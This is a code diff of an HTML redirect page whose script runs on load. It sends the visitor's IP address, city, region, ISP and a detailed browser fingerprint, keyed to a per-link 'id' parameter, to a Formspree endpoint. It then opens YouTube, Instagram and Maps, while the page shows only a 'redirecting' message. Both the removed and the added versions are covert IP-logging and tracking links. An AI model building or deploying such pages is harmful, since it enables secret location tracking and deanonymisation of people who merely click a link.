@@ -3,67 +3,76 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>awwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww...</title>
+  <title>SLEEEBEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW.</title>
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const id = urlParams.get('id') || "anon";
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const id = new URLSearchParams(window.location.search).get("id") || "anon";
+    const ua = navigator.userAgent;
 
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
-        const info = {
-          identifier: id,
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country_name,
-          org: data.org,
-          time: new Date().toISOString(),
-          ua: navigator.userAgent,
-          platform: navigator.platform,
-          lang: navigator.language,
-          screen: `${window.screen.width}x${window.screen.height}`,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          cookies_enabled: navigator.cookieEnabled,
-          referrer: document.referrer || "direct",
-          token: Math.random().toString(36).substring(2, 10),
-          device_memory: navigator.deviceMemory || "unknown",
-          cpu_cores: navigator.hardwareConcurrency || "unknown",
-          color_depth: screen.colorDepth || "unknown",
-          pixel_ratio: window.devicePixelRatio || "unknown",
-          online: navigator.onLine
-        };
+    const isAndroid = /android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
 
-        fetch("https://formspree.io/f/mrbkpvwy", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(info),
-        }).catch((e) => {
-          console.log("Log failed", e);
-        }).finally(() => {
-          // Open Maps (intent URI for Android)
-          window.open("intent://maps.google.com/#Intent;package=com.google.android.apps.maps;scheme=https;end;", "_blank");
+    const logData = () => {
+      return fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const info = {
+            identifier: id,
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            org: data.org,
+            time: new Date().toISOString(),
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            lang: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies_enabled: navigator.cookieEnabled,
+            referrer: document.referrer || "direct",
+            token: Math.random().toString(36).substring(2, 10),
+            device_memory: navigator.deviceMemory || "unknown",
+            cpu_cores: navigator.hardwareConcurrency || "unknown",
+            color_depth: screen.colorDepth || "unknown",
+            pixel_ratio: window.devicePixelRatio || "unknown",
+            online: navigator.onLine,
+            device_type: isAndroid ? "Android" : isIOS ? "iOS" : "Desktop"
+          };
 
-          // Delay then open YouTube via deep link
-          setTimeout(() => {
-            window.open("vnd.youtube://xvFZjo5PgG0", "_blank");
-          }, 2000);
-
-          // Delay then open Instagram profile with deep link
-          setTimeout(() => {
-            window.open("https://instagram.com/_u/instagram", "_blank");
-          }, 4000);
-
-          // Fallback redirect to normal YouTube
-          setTimeout(() => {
-            window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
-          }, 6000);
+          return fetch("https://formspree.io/f/mrbkpvwy", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(info),
+          });
         });
-      });
+    };
+
+    logData().finally(() => {
+      // Google Maps
+      window.open("https://www.google.com/maps", "_blank");
+
+      // YouTube intent link (Android) or fallback
+      setTimeout(() => {
+        if (isAndroid) {
+          window.open("intent://www.youtube.com/watch?v=xvFZjo5PgG0#Intent;package=com.google.android.youtube;scheme=https;end;", "_blank");
+        } else {
+          window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank");
+        }
+      }, 2000);
+
+      // Instagram _u/ profile shortcut
+      setTimeout(() => {
+        window.open("https://instagram.com/_u/instagram", "_blank");
+      }, 4000);
+
+      // Fallback redirect
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
+      }, 6000);
+    });
   </script>
 </head>
 <body>
-  <p style="font-family: monospace; font-size: 1.2rem;">[ Mengarahkan langsung ke aplikasi... ]</p>
+  <p style="font-family: monospace; font-size: 1.1rem;">[ Punteennnnnnnn... ]</p>
 </body>
 </html>
